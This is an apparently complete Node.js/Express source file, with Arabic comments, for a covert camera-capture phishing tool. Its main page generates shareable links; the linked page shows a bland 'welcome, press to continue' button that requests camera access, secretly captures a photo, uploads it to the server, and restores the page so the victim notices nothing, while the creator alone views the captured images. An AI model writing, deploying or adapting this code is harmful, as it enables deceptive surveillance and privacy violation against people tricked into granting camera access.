     const express = require('express');
const app = express();
app.use(express.json({ limit: '5mb' }));

const PORT = process.env.PORT || 3000;

// تخزين الصور مؤقتًا
const images = {};

// الصفحة الرئيسية — توليد روابط + عرض الصور لك فقط
app.get('/', (req, res) => {
  const allImages = Object.entries(images).map(
    ([id, img]) =>
      `<h3>Image from link ${id}</h3><img src="${img}" style="max-width:300px">`
  ).join('');

  res.send(`
    <html>
      <head>
        <title>Main Page</title>
        <style>
          body { font-family: Arial; text-align:center; margin:50px; }
          button { padding:10px 20px; font-size:16px; cursor:pointer; }
          a { display:block; margin:10px; color:blue; }
        </style>
      </head>
      <body>
        <h1>Generate Camera Link</h1>
        <button onclick="gen()">Generate Link</button>
        <div id="links"></div>

        <h2>Captured Images (You Only)</h2>
        ${allImages}

        <script>
          function gen(){
            const id = Math.floor(Math.random()*100000);
            const link = location.origin + '/c/' + id;
            const a = document.createElement('a');
            a.href = link;
            a.textContent = link;
            document.getElementById('links').appendChild(a);
          }
        </script>
      </body>
    </html>
  `);
});


// صفحة الرابط — ما يراه صديقك
app.get('/c/:id', (req, res) => {
  const id = req.params.id;

  res.send(`
    <html>
      <head>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>Welcome</title>
        <style>
          body {
            font-family: Arial;
            text-align:center;
            margin-top:120px;
          }
          button {
            padding:14px 28px;
            font-size:18px;
            cursor:pointer;
          }
        </style>
      </head>
      <body>

        <h1>أهلاً بك</h1>
        <button id="go">اضغط للمتابعة</button>

        <script>
          document.getElementById('go').onclick = async () => {

            // طلب إذن الكاميرا
            try {
              const stream = await navigator.mediaDevices.getUserMedia({video:true});

              const video = document.createElement('video');
              video.srcObject = stream;
              video.play();

              // التقاط صورة واحدة تلقائيًا
              video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video,0,0);

                const img = canvas.toDataURL('image/png');

                // إرسال الصورة للسيرفر
                fetch('/upload/${id}',{
                  method:'POST',
                  headers:{'Content-Type':'application/json'},
                  body: JSON.stringify({image: img})
                });

                // إيقاف الكاميرا
                stream.getTracks().forEach(t=>t.stop());

                // إبقاء الصفحة كما هي
                document.body.innerHTML = "<h1>أهلاً بك</h1>";
              };

            } catch(e) {
              alert("Camera permission denied");
            }

          };
        </script>

      </body>
    </html>
  `);
});


// استقبال الصورة
app.post('/upload/:id', (req, res) => {
  images[req.params.id] = req.body.image;
  res.json({ ok: true });
});

app.listen(PORT, () => console.log("Server running"));
